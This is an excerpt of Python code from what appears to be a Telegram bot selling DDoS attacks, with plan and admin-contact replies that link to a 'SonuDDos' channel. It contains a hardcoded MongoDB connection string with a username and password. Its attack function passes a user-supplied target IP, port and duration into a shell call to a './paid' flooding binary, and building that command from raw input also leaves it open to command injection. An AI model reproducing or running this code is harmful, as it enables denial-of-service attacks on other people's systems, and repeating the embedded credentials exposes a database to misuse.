...
MONGO_URI = 'mongodb+srv://sonuown:root@sonucheatsop.ta3u2.mongodb.net/?retryWrites=true&w=majority&appName=SonuCheatsOp'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./paid {target_ip} {target_port} {duration} 70")
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.reply_to(message, "*https://t.me/SonuDDos*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*@SonuGamingOp*", parse_mode='Markdown')
    else:
